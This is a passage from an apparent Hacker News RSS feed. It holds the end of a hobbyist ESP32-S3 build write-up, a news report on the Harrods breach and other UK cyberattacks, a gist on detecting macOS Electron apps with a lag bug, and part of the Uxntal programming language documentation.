    &lt;p&gt;Since I may need to continue development (e.g. fixing bugs) once these devices are in the wild, I wanted a way to send messages to only my debugging device. Fortunately, ESP32-S3 Nanos have a unique mac address identifier, so I wrote code to check whether a device is a development unit under my control. If it is, it subscribes to an additional MQTT topic that only receives debugging messages. Debugging messages are set through the web app via a toggle:&lt;/p&gt;
    &lt;p&gt;The fact that the ESP32-S3 Nanos have their own unique identifier means I don't need different code for production devices versus debugging devices (or at least in that section of the code). While I could have handled this in other ways, I'm satisfied with how this solution works.&lt;/p&gt;
    &lt;head rend="h2"&gt;3D Printed Case&lt;/head&gt;
    &lt;p&gt;While I learned a ton designing this case, the smartest thing I did was test print each CAD feature as I finished designing it. This meant printing something like the servo holder only took 15 minutes, and then I could dry fit the parts together to ensure they actually fit. This saved a lot of time on iterating fit and printing, as well as minimizing plastic waste.&lt;/p&gt;
    &lt;p&gt;My CAD design experience before SplashFlag was limited to simple enclosures. SplashFlag taught me how to make more complex designs, including screw mounts and snap-fit parts.&lt;/p&gt;
    &lt;p&gt;The case design is simple. The front panel holds the LCD. The remaining components (ESP32-S3 Nano, servo, USB-C power plug, tactile reset button) mount to the back panel.&lt;/p&gt;
    &lt;p&gt;As mentioned earlier, the LCD with I2C breakout took up a lot of room, leading to the wide frame around the LCD.&lt;/p&gt;
    &lt;p&gt;The ESP32-S3 Nano, servo, and USB-C plug attach to the case with small metric screws. The LCD panel bolts onto the front plate with an embedded nut.&lt;/p&gt;
    &lt;p&gt;While I was designing this, it took many iterations to figure out how to get all the parts to fit together while minimizing space. I also had to consider the limitations of 3D printers and assembly so the final case would be possible to print and assemble successfully.&lt;/p&gt;
    &lt;p&gt;One oversight I made was forgetting to leave space for the bolts that would hold the two halves of the case together. Originally I was going to make the case snap-fit together without any hardware, so I didn't include bolts in my design, but I decided to add bolts once I realized how relatively heavy all the components would be and all the wiring that would need to stay confined to the inside of the device. If I had modeled the case properly in Fusion360 with components, I could have easily moved things around after I realized I needed case bolts. But since I didn't realize I could do that until I had spent hours designing the case the wrong way, I decided to be OK settling with the imperfections.&lt;/p&gt;
    &lt;p&gt;My favorite part of the case is the snap-fit housing for the tactile button. It allows for a small breadboard switch to become a neatly integrated button. Definitely a design I will use again in future projects:&lt;/p&gt;
    &lt;p&gt;As a final embellishment, I added the text SplashFlag to the top of the device. I only have a single-color 3D printer, so this meant printing the outline of the letters in blue, then the letters themselves (slightly smaller) in white. Final assembly involved super gluing them together on the top of the case.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Isn't Included&lt;/head&gt;
    &lt;p&gt;As much as I packed this device with features, I didn't include everything.&lt;/p&gt;
    &lt;p&gt;If I wanted to devote more time to this project, I'd probably first enable TLS for all HTTP connections. The idea of writing code to automatically update the CA certs on the device (and maintaining TLS certs on the server app) over time didn't seem worth it for a hobby project.&lt;/p&gt;
    &lt;p&gt;Also, secrets like the WiFi password and MQTT credentials are not encrypted at rest. They are stored in the ESP32-S3 Nano's non-volatile memory, allowing anyone with physical access to the device to potentially retrieve them without too much effort. The ESP32-S3 Nano does have eFuses which can help with storing cryptographic keys (which could then be used to encrypt the credentials), but adding that capability didn't make the cut due to time constraints.&lt;/p&gt;
    &lt;head rend="h1"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Who knows if I will use it, but this build taught me I am capable of making steady, regular progress towards long-term projects.&lt;/p&gt;
    &lt;p&gt;I am probably not going to large scale manufacture these for the neighborhood, but I gained confidence in building a complete hardware device on my own that works well. When the next product idea strikes, I'll already have a lot of the knowledge (and code!) required for building it.&lt;/p&gt;
    &lt;p&gt;Is it perfect? No. Is it better than some IoT devices I've purchased, with easier updates and repairs? Definitely.&lt;/p&gt;
    &lt;head rend="h1"&gt;How to Build Your Own SplashFlag&lt;/head&gt;
    &lt;head rend="h3"&gt;Parts List&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;ESP32-S3 Nano&lt;/item&gt;
      &lt;item&gt;1602 LCD Display with I2C adapter for easier wiring&lt;/item&gt;
      &lt;item&gt;Feetech FS90 9g Servo&lt;/item&gt;
      &lt;item&gt;6x6x5mm tactile push button switch&lt;/item&gt;
      &lt;item&gt;.1 uF decoupling capacitor&lt;/item&gt;
      &lt;item&gt;220ohm pull-down resistor&lt;/item&gt;
      &lt;item&gt;USB-C Power Adapter and cable&lt;/item&gt;
      &lt;item&gt;Variety of M1.6-M2.5 screws and bolts to mount all the components&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Code and Files&lt;/head&gt;
    &lt;p&gt;Complete code for the ESP32-S3 Nano and web app, as well as the 3D printed case are available at the SplashFlag GitHub Repo.&lt;/p&gt;
    &lt;p&gt;The code for the ESP32-S3 Nano is configured with PlatformIO. This configuration handles downloading and installing all C++ dependencies. If you use PlatformIO in Visual Studio Code like I do, you can open the repo's &lt;code&gt;hardware&lt;/code&gt; folder, build the code, and upload it to the board.&lt;/p&gt;
    &lt;p&gt;The web app runs in a Docker container. You will need to generate an auth password for the mosquitto service as well as configure a Cloudflare Tunnel if you are going to be self hosting. Details for doing this are in SplashFlag backend README.&lt;/p&gt;
    &lt;head rend="h3"&gt;Case Assembly and Wiring&lt;/head&gt;
    &lt;p&gt;3D printing the files shouldn't require any supports, with the exception of the cutout for the USB-C cable. I used .10mm layer heights with PLA+ filaments. The snap-fit tactile button is the component with the tightest dimensional tolerance - I recommend slicing up the back panel and printing only this button enclosure at first to ensure your printer is calibrated correctly. If that piece prints correctly, the rest of the case should print without any issues.&lt;/p&gt;
    &lt;p&gt;I don't have a nice wiring schematic, but the photo below with details should help.&lt;lb/&gt; - The I2C adapter is wired to pins A4 and A5. - The servo is wired to D9 as well as 5V and ground. I put the decoupling capacitor near the servo to ensure smooth power. - The USB-C adapter gets the stable power in, and it is tied to the VIN and ground pins on the ESP32-S3 Nano. - The tactile button is tied to ground with the pull-down resistor and wired to D4 on the ESP32-S3 Nano. &lt;/p&gt;
    &lt;p&gt;After confirming everything worked on a breadboard, I mounted the components to the case. I then soldered the component wires together, tested again, and once I was confident things still worked, encased all connections in hot glue:&lt;/p&gt;
    &lt;p&gt;Note: the red wire hanging off to the left in the above photo was an extra wire I later clipped off - I miscounted while creating my wires.&lt;/p&gt;
    &lt;p&gt;Maybe my next project will involve designing a custom PCB board to make the wiring easier.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437027</guid><pubDate>Wed, 01 Oct 2025 12:43:51 +0000</pubDate></item><item><title>Hackers strike Harrods in latest UK cyberattack</title><link>https://observer.co.uk/news/national/article/hackers-strike-harrods-in-latest-uk-cyberattack</link><description>&lt;doc fingerprint="74010a15849eeefc"&gt;
  &lt;main&gt;
    &lt;p&gt;Harrods has warned customers that hackers may have stolen their personal data in the latest IT security breach to blight UK businesses.&lt;/p&gt;
    &lt;p&gt;The department store said ânames and contact detailsâ were taken from an unnamed third-party system Harrods uses for online shopping. The breach did not extend to passwords or payment cards, it said.&lt;/p&gt;
    &lt;p&gt;In July, four people including a 17-year-old boy were arrested on suspicion of being involved in cyberattacks on Harrods, the Co-op, and Marks and Spencer, and were bailed pending further inquiries.&lt;/p&gt;
    &lt;p&gt;Reports of cyberattacks have been increasing in recent months. Last week, hackers stole names, addresses and pictures of about 8,000 children from Kido, a nursery chain, and published some on the dark net. Parents reportedly received phone calls from people claiming to be linked to the hack in anÂ apparent blackmail attempt.&lt;/p&gt;
    &lt;p&gt;Thousands of passengers at Heathrow and other European airports were delayed last week after a ransomware attack on Collins Aerospace. A man in his 40s was arrested in West Sussex last week, the National Crime Agency said, although it was continuing to investigate.&lt;/p&gt;
    &lt;p&gt;Related articles:&lt;/p&gt;
    &lt;p&gt;Meanwhile, Jaguar Land Roverâs production lines remain idle after a cyberattack in August, and may not restart until November. LNER and Qantas have also suffered disruption from attacks this year, and last year the NHS postponed 11,000 appointments and procedures due to a ransomware attack.&lt;/p&gt;
    &lt;p&gt;Growing awareness of the frailties of the UKâs cybersecurity capabilities may undermine the prime ministerâs desire to introduce digital ID cards in an attempt to control illegal working.&lt;/p&gt;
    &lt;p&gt;Yesterday, more than 1.6 million people had signed a parliamentary petition demanding that the government scrap plans for a digital ID. Professor Alan Woodward, a computer scientist at the University of Surrey, said an ID card database would present a huge target for hackers.&lt;/p&gt;
    &lt;p&gt;Although cyberattacks have become more high profile, there is little reliable data on how many attacks take place in the UK each year. Hackers are drawn from a mix of organised criminal gangs, those sponsored by state actors including Russia and China, and hacktivists with a political agenda, according to a report by the Royal United Services Institute (Rusi).&lt;/p&gt;
    &lt;p&gt;A government survey found that half of businesses reported some form of a security breach in the previous 12 months.&lt;/p&gt;
    &lt;p&gt;A new cybersecurity and Âresilience bill will make it mandatory to report more incidents. The billâs slow progress is frustrating security experts, according to Jamie MacColl, a senior research fellow at Rusi. However, ministers have been reluctant to impose more regulation on businesses, but having âmajor cybersecurity incidents is not good for economic growth,â he said.&lt;/p&gt;
    &lt;p&gt;Further reading: Cyberattacks on JLR piles pressure on the governmentÂ&lt;/p&gt;
    &lt;p&gt;Photograph by Andy Hall for The Observer&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437060</guid><pubDate>Wed, 01 Oct 2025 12:47:10 +0000</pubDate></item><item><title>Detect Electron apps on Mac that hasn't been updated to fix the system wide lag</title><link>https://gist.github.com/tkafka/e3eb63a5ec448e9be6701bfd1f1b1e58</link><description>&lt;doc fingerprint="a2a91fb30413a7ae"&gt;
  &lt;main&gt;
    &lt;p&gt;See:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;electron/electron#48311 (comment)&lt;/item&gt;
      &lt;item&gt;https://mjtsai.com/blog/2025/09/30/electron-apps-causing-system-wide-lag-on-tahoe/&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Fixed versions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;36.9.2&lt;/item&gt;
      &lt;item&gt;37.6.0&lt;/item&gt;
      &lt;item&gt;38.2.0&lt;/item&gt;
      &lt;item&gt;39.0.0&lt;/item&gt;
      &lt;item&gt;and all above 39&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This script detects apps with not yet updated versions of Electron.&lt;/p&gt;
    &lt;p&gt;Run&lt;/p&gt;
    &lt;code&gt;launchctl setenv CHROME_HEADLESS 1&lt;/code&gt;
    &lt;p&gt;on every system start. The CHROME_HEADLESS flag has a side effect of disabling Electron app window shadows, which makes them ugly, but also stops triggering the issue.&lt;/p&gt;
    &lt;p&gt;(as of 1st oct 2025 - it lists all electron apps, but none shows the ✅ checkmark so far)&lt;/p&gt;
    &lt;code&gt;❌ OpenMTP.app: Electron 18.3.15 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ DaVinci Resolve.app: Electron 36.3.2 (Contents/Applications/Electron.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ Electron.app: Electron 36.3.2 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ Visual Studio Code.app: Electron 37.3.1 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ Cursor.app: Electron 34.5.8 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ Windsurf.app: Electron 34.4.0 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ Claude.app: Electron 36.4.0 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ Signal.app: Electron 38.1.2 (Contents/Frameworks/Electron Framework.framework/Electron Framework)
❌ Figma Beta.app: Electron 37.5.1 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ Beeper Desktop.app: Electron 33.2.0 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
❌ Slack.app: Electron 38.1.2 (Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework)
&lt;/code&gt;
    &lt;p&gt;If you'd appreciate a visual (Tufte-like) hour by hour forecast for iOS/Apple Watch/mac with nice widgets, I made one - check out 🌦️ Weathergraph.&lt;/p&gt;
    &lt;p&gt;Thanks! Tomas&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437112</guid><pubDate>Wed, 01 Oct 2025 12:54:17 +0000</pubDate></item><item><title>Uxntal: A programming language for the Uxn virtual machine</title><link>https://wiki.xxiivv.com/site/uxntal.html</link><description>&lt;doc fingerprint="7a80d8908c86ba54"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;A programming language for the Uxn virtual machine.&lt;/head&gt;
    &lt;p&gt;Uxn programs are written in a concatenative flavor of assembly designed especially to map to the idiosyncrasies of this strange little computer. &lt;lb/&gt;See the Quick Setup to get started.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Cheatsheet, by Weeble.&lt;/item&gt;
      &lt;item&gt;Zine, by Clemens Scott.&lt;/item&gt;
      &lt;item&gt;Tutorial, by Compudanzas&lt;/item&gt;
      &lt;item&gt;Manual(7), by Eiríkr Åsheim.&lt;/item&gt;
      &lt;item&gt;BNF Notation, by Jack Leightcap.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;Firstly, there are no precedence rules, the calculations are merely performed in the sequence in which they are presented. The order with which elements come off the stack is known as Last In, First Out. In the stack a b c, the c item was the last to be added, and will be the first to be removed.&lt;/p&gt;
    &lt;quote&gt;#01 DUP ADD #03 MUL program&lt;/quote&gt;
    &lt;quote&gt;01 01 02 03 06 stack 01 02&lt;/quote&gt;
    &lt;p&gt;Uxntal numbers are expressed in hexadecimal. Which means that counting goes like: one, two, three, four, five, six, seven, eight, nine, ha, be, ce, de, he, fe, ten! It takes some getting used to, but don't worry, you'll get the hang of it. Now, without further ado..&lt;/p&gt;
    &lt;head rend="h3"&gt;Let's dive into it!&lt;/head&gt;
    &lt;p&gt;The following example program prints the phrase "Hello World!" by pushing the address to a label on the stack, and iterating through each letter found at that address with a loop that increments the pointer until it reaches end of the phrase, at which point, the stack is emptied and the evaluation halts.&lt;/p&gt;
    &lt;p&gt;A word starting with @ defines a label, and one starting with ; pushes the absolute address of a label to the stack. With that in mind, ;text pushes the two bytes equal to the address of the @text label to the stack. In the interpreter above, press "step" to walk through each step of the evaluation.&lt;/p&gt;
    &lt;p&gt;Next, we define a new label named @while, to mark the start of the loop that will print each character stored at the text label.&lt;/p&gt;
    &lt;p&gt;The LDAk opcode loads a byte at the address currently at the top of the stack, in this case, the ascii letter H(48). The k-mode indicates that the operator will not consume the address.&lt;/p&gt;
    &lt;p&gt;The DUP opcode makes a copy of the letter. The ?{ pops that copy from the stack, and if it is not zero, we jump to the corresponding }, which is an anonymous label(λ00).&lt;/p&gt;
    &lt;quote&gt;( Disassembly of the example above: |addr bytecode Uxntal ----- -------- ------- ) |0100 a0 01 12 ( ;text ) @while |0103 94 ( LDAk ) |0104 06 ( DUP ) |0105 20 00 03 ( ?λ00 ) |0108 02 ( POP ) |0109 22 ( POP2 ) |010a 00 ( BRK )&lt;/quote&gt;
    &lt;p&gt;The #18 word pushes a number to the stack, which maps to the Console/write port(#18), followed by the DEO opcode that pops both bytes(the letter and the port) and sends the letter to that device port, telling the Console to print it, leaving only the address on top of the stack.&lt;/p&gt;
    &lt;p&gt;The INC2 opcode increments the address, moving the text pointer to the next letter. The 2-mode is used because address addresses are always made of two bytes.&lt;/p&gt;
    &lt;quote&gt;@λ00 |010b 80 18 ( #18 ) |010d 17 ( DEO ) |010e 21 ( INC2 ) |010f 40 ff f1 ( !while )&lt;/quote&gt;
    &lt;p&gt;Finally, with !while we jump back to the @while label, and repeat the loop until there are no more letters to load. When that happens, we POP to remove the duplicated letter, and POP2 to remove the address on the stack to keep the stack clean at the end of the evaluation.&lt;/p&gt;
    &lt;quote&gt;@text |0112 48 65 6c ( H e l ) |0115 6c 6f 20 ( l o ) |0117 57 6f 72 ( W o r ) |011a 6c 64 21 ( l d ! )&lt;/quote&gt;
    &lt;head rend="h3"&gt;Summary&lt;/head&gt;
    &lt;p&gt;Comments are within parentheses, numbers are lowercase hexadecimal shorts or bytes and opcodes are uppercased reserved words with lowercased modes. A rune is a non-alphanumeric symbol at the start of a word, literal numbers are prefixed with a # rune, addressing is done by one of six runes. Labels and macros are unique non-numeric, non-opcode and non-runic symbols.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="8"&gt;
        &lt;cell role="head"&gt;Padding Runes&lt;/cell&gt;
        &lt;cell role="head"&gt;Number Rune&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;
          &lt;code&gt;|&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;absolute&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;$&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;relative&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;#&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;literal number&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;Label Runes&lt;/cell&gt;
        &lt;cell&gt;Ascii Runes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;
          &lt;code&gt;@&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;parent&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;&amp;amp;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;child&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;"&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;raw ascii&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;Addressing Runes&lt;/cell&gt;
        &lt;cell&gt;Wrapping Runes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;
          &lt;code&gt;,&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;literal relative&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;_&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;raw relative&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;( )&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;comment&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;
          &lt;code&gt;.&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;literal zero-page&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;-&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;raw zero-page&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;{ }&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;anonymous&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;
          &lt;code&gt;;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;literal absolute&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;=&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;raw absolute&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;[ ]&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;ignored&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;Immediate Runes&lt;/cell&gt;
        &lt;cell&gt;Pre-processor Runes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;!&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;jmi&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;?&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;jci&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;% { }&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;macro&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;Uxntal Stacks&lt;/head&gt;
    &lt;p&gt;All programming in Uxntal is done by manipulating the working stack, and return stack, each stack contains 256 bytes. Here are some stack primitives assuming the initial state of the stack is &lt;code&gt;a b c&lt;/code&gt; where
&lt;code&gt;c&lt;/code&gt; is the top of the stack: &lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;POP&lt;/cell&gt;
        &lt;cell&gt;a b&lt;/cell&gt;
        &lt;cell&gt;Discard top item.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;NIP&lt;/cell&gt;
        &lt;cell&gt;a c&lt;/cell&gt;
        &lt;cell&gt;Discard second item.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;SWP&lt;/cell&gt;
        &lt;cell&gt;a c b&lt;/cell&gt;
        &lt;cell&gt;Move second item to top.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ROT&lt;/cell&gt;
        &lt;cell&gt;b c a&lt;/cell&gt;
        &lt;cell&gt;Move third item to top.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DUP&lt;/cell&gt;
        &lt;cell&gt;a b c c&lt;/cell&gt;
        &lt;cell&gt;Copy top item.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;OVR&lt;/cell&gt;
        &lt;cell&gt;a b c b&lt;/cell&gt;
        &lt;cell&gt;Copy second item to top.&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;A byte is a number between 0-255(256 values), a short is a number between 0-65535(65536 values) made of two bytes, each byte in a short can be manipulated individually:&lt;/p&gt;
    &lt;quote&gt;#0a #0b POP 0a #12 #3456 NIP 12 56 #1234 DUP 12 34 34&lt;/quote&gt;
    &lt;p&gt;The two stacks are circular, to pop an empty stack does not trigger an error, but merely means to set the stack pointer to 255. There are no invalid programs, any sequence of bytes is a potential Uxn program. Values are moved between stacks with the STH opcode.&lt;/p&gt;
    &lt;quote&gt;WST 00 00 00 00 00 00|12 34 &amp;lt;02 RST 00 00 00 00 00 00 00|56 &amp;lt;01&lt;/quote&gt;
    &lt;p&gt;The program above contains 12 and 34 on the working stack, and 56 on the return stack. The stack content can always be printed by sending a non-null byte to the System/debug port.&lt;/p&gt;
    &lt;head rend="h2"&gt;Uxntal Notation&lt;/head&gt;
    &lt;p&gt;The Uxntal notation follows that of the Forth programming language, where each item on the left of the -- spacer is the state of the stack before, and to the right, the state of the stack after. On each side, the right-most item is the last to the pushed and the first to be removed:&lt;/p&gt;
    &lt;quote&gt;@routine ( a b -- a b res ) ADDk JMP2r&lt;/quote&gt;
    &lt;p&gt;Single items are a byte long, and shorts are indicated with a * suffix, the order in which they appear is the order of the stack with the top item to the right:&lt;/p&gt;
    &lt;quote&gt;@routine ( a b* -- b* a ) ROT JMP2r&lt;/quote&gt;
    &lt;p&gt;The dot notation is used to indicate that stack effects to the right of the dot are happening on the return stack:&lt;/p&gt;
    &lt;quote&gt;@routine ( a . b -- c ) STHr ADD JMP2r&lt;/quote&gt;
    &lt;p&gt;If a routine is a vector, it uses the arrow notation.&lt;/p&gt;
    &lt;quote&gt;@on-event ( -&amp;gt; ) BRK&lt;/quote&gt;
    &lt;p&gt;This notation also holds for macros as well, the notation goes before the macro's body:&lt;/p&gt;
    &lt;quote&gt;%macro ( a b -- res ) { DIVk MUL SUB }&lt;/quote&gt;
    &lt;head rend="h3"&gt;Validation&lt;/head&gt;
    &lt;p&gt;Program validation is done at compile-time by comparing a routine's stack effect, against the resulting balance of all stack changes occurring in the routine's code. Words that do not pass the stack-checker are generating a warning, and so essentially this defines a very basic and permissive type system that nevertheless catches some invalid programs and enables compiler optimizations. For more details, see Uxnbal.&lt;/p&gt;
    &lt;p&gt;The simplest case is when a piece of code does not have any branches or recursion, and merely pushes literals and calls words. The stack effect routines is always known statically from the declaration.&lt;/p&gt;
    &lt;quote&gt;@add-eight ( a -- a+8 ) #0008 ADD JMP2r&lt;/quote&gt;
    &lt;quote&gt;Working-stack imbalance of +1, in add-eight.&lt;/quote&gt;
    &lt;p&gt;In the case of branching, each branch is evaluated and if an imbalance occurs inside one of the branches, the branch name is indicated:&lt;/p&gt;
    &lt;quote&gt;@branching ( a* -- c ) LDAk #01 EQU ?&amp;amp;one LDAk #02 EQU ?&amp;amp;two POP2 #ff JMP2r &amp;amp;one ( a* -- c ) POP2 #12 JMP2r &amp;amp;two ( a* -- c d ) ADD JMP2r&lt;/quote&gt;
    &lt;quote&gt;Working-stack imbalance of -1, in branching/two.&lt;/quote&gt;
    &lt;p&gt;In the case of a recursion, the validator will use the stack effect instead of repeatedly walking through the body of the routine.&lt;/p&gt;
    &lt;quote&gt;@print-string ( str* -- ) LDAk DUP ?{ POP POP2 JMP2r } emit-letter INC2 !print-string&lt;/quote&gt;
    &lt;p&gt;For loops that exits without affecting the stack depth, a &amp;gt; prefixed label is used as a shorthand to reduce the need for extraneous stack effect definitions in cases where it can be inferred:&lt;/p&gt;
    &lt;quote&gt;@many-times ( a -- ) DUP &amp;amp;&amp;gt;l INC DUP ?&amp;amp;&amp;gt;l POP2 JMP2r&lt;/quote&gt;
    &lt;p&gt;Routines that pull items from the stack beyond their allowed depth will also raise a warning, making the stack effect act a sort of boundary:&lt;/p&gt;
    &lt;quote&gt;@shallow ( a -- ) POP2 JMP2r&lt;/quote&gt;
    &lt;quote&gt;Working-stack depth error of 1, in shallow.&lt;/quote&gt;
    &lt;p&gt;Lastly, a runtime specific solution to validate the stack state at any one point during the execution of a program, is to read the System/wst port and compare it against a given stack pointer byte value.&lt;/p&gt;
    &lt;quote&gt;@on-reset ( -&amp;gt; ) #abcd DUP2 .System/wst DEI #05 EQU ?{ #01 .System/debug DEO } BRK&lt;/quote&gt;
    &lt;head rend="h3"&gt;Comments&lt;/head&gt;
    &lt;p&gt;A comment starts with any token beginning with opened parenthesis, and ends at its corresponding closed parenthesis. Comments may be nested, the enclosed comments parentheses must be whitespace separated on both sides.&lt;/p&gt;
    &lt;quote&gt;( ( nested ) ) ( 1+2*(4/3) )&lt;/quote&gt;
    &lt;p&gt;Outermost comments may be named, which means that sometimes the open parenthesis is immediately followed by a word used to indicates some meaning to external tools.&lt;/p&gt;
    &lt;quote&gt;(doc This is a docstring. )&lt;/quote&gt;
    &lt;p&gt;Special comments are sometimes used to group routines together, they are similar to the &lt;code&gt;pragma mark&lt;/code&gt; notation:&lt;/p&gt;
    &lt;quote&gt;( @|Group )&lt;/quote&gt;
    &lt;head rend="h3"&gt;Brackets&lt;/head&gt;
    &lt;p&gt;The square brackets do nothing, they are there merely for readability and formatting, they are useful for making explicit certain things like grouping behaviors, joining literals or indicating lookup tables.&lt;/p&gt;
    &lt;quote&gt;@routine ( -- ) [ LIT2 20 -Console/write ] DEO JMP2r %min ( a b -- r ) { GTHk [ JMP SWP ] POP } @sprite [ 00 66 ff ff ff 7e 3c 18 ]&lt;/quote&gt;
    &lt;head rend="h2"&gt;Uxntal Opcodes&lt;/head&gt;
    &lt;p&gt;Uxn has 32 standard opcodes and 4 immediate opcodes. In the table below, the pipe(|) character indicates an effect on the return stack, the &lt;code&gt;pc is the program counter, a &lt;/code&gt;&lt;code&gt;value8&lt;/code&gt; indicates a byte
length, a &lt;code&gt;value*&lt;/code&gt; indicates a short length, an unspecified length follows the short mode and a &lt;code&gt;[value]&lt;/code&gt; is read from memory.&lt;/p&gt;
    &lt;quote&gt;Stack I Logic Memory I Arithmetic BRK -- EQU a b -- a=b LDZ abs8 -- [abs8] ADD a b -- a+b INC a -- a+1 NEQ a b -- a≠b STZ val abs8 -- SUB a b -- a-b POP a -- GTH a b -- a&amp;gt;b LDR rel8 -- [rel8] MUL a b -- a×b NIP a b -- b LTH a b -- a&amp;lt;b STR val rel8 -- DIV a b -- a÷b Stack II Stash Memory II Bitwise SWP a b -- b a JMP addr -- LDA abs* -- [abs*] AND a b -- a&amp;amp;b ROT a b c -- b c a JCN cond8 addr -- STA val abs* -- ORA a b -- a|b DUP a -- a a JSR addr -- | pc* DEI dev -- [dev] EOR a b -- a^b OVR a b -- a b a STH a -- | a DEO val dev -- SFT a sft8 -- res LIT -- [pc*] JCI cond8 -- JMI -- JSI -- | pc*&lt;/quote&gt;
    &lt;head rend="h3"&gt;Modes&lt;/head&gt;
    &lt;p&gt;An opcode is any name in which the 3 first characters are found in the opcode table, followed by any combination of 2, k and r. Each opcode has 3 possible modes, which can combined:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The short mode 2 operates on shorts, instead of bytes.&lt;/item&gt;
      &lt;item&gt;The keep mode k operates without consuming items.&lt;/item&gt;
      &lt;item&gt;The return mode r operates on the return stack.&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="8"&gt;
        &lt;cell role="head"&gt;INC2r&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;k&lt;/cell&gt;
        &lt;cell&gt;r&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;opcode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;0&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
